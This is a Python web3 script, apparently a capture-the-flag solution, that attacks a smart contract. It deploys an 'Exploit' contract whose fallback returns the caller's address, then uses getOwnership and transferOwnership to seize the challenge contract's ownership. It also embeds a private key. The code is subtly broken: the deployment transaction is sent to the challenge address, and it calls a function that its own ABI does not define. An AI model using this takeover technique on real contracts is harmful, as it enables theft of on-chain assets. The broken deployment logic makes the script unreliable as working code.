from web3 import Web3
import json
from solcx import compile_source

RPC_URL = "https://otter.bordel.wtf/erigon"
PRIVATE_KEY = "0x4ccd8e28d60982c8086aa952f902dad8e53034e0c39a91102395ca07fd50a145"
PLAYER_ADDRESS = "0xEfd9A03AF689010fA76eB9671787B3Bd37dBDA20"
CHALLENGE_ADDRESS = "0x435D2FB64250E50DDB5501c015C9bb56b9CB923a"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = w3.eth.account.from_key(PRIVATE_KEY)

# Deploy Exploit Contract
exploit_contract = '''
pragma solidity ^0.8.0;

contract Exploit {
    address public player;

    constructor(address _player) {
        player = _player;
    }

    fallback() external payable {
        assembly {
            mstore(0, caller())
            return(0, 32)
        }
    }
}
'''

compiled_exploit = w3.eth.contract(abi=[], bytecode="0x" + compile_source(exploit_contract)['<stdin>:Exploit']['bin'])  # Compile and insert bytecode here
tx = {
    "from": PLAYER_ADDRESS,
    "to": CHALLENGE_ADDRESS,  # Contract deployment
    "data": compiled_exploit.bytecode,
    "gas": 3000000,
    "maxFeePerGas": w3.eth.gas_price,  # EIP-1559: Base fee
    "maxPriorityFeePerGas": w3.to_wei(2, "gwei"),  # Small tip
    "nonce": w3.eth.get_transaction_count(PLAYER_ADDRESS),
    "chainId": 39438142  # ✅ Correct chain ID
}
signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

EXPLOIT_ADDRESS = tx_receipt.contractAddress
print(f"Exploit deployed at: {EXPLOIT_ADDRESS}")

# Call getOwnership
challenge = w3.eth.contract(address=CHALLENGE_ADDRESS, abi=json.loads('[{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"getOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]'))
tx = challenge.functions.getOwnership(EXPLOIT_ADDRESS).build_transaction({
    "from": PLAYER_ADDRESS,
    "gas": 200000,
    "maxFeePerGas": w3.eth.gas_price,
    "maxPriorityFeePerGas": w3.to_wei(2, "gwei"),
    "nonce": w3.eth.get_transaction_count(PLAYER_ADDRESS),
    "chainId": 39438142  # ✅ Correct chain ID
})
signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

print("Ownership taken!")

# Verify ownership
tx = challenge.functions.transferOwnership(PLAYER_ADDRESS).build_transaction({
    "from": PLAYER_ADDRESS,
    "gas": 100000,
    "maxFeePerGas": w3.eth.gas_price,
    "maxPriorityFeePerGas": w3.to_wei(2, "gwei"),
    "nonce": w3.eth.get_transaction_count(PLAYER_ADDRESS),
    "chainId": 39438142  # ✅ Correct chain ID
})
signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

print("Ownership transferred back to us!")
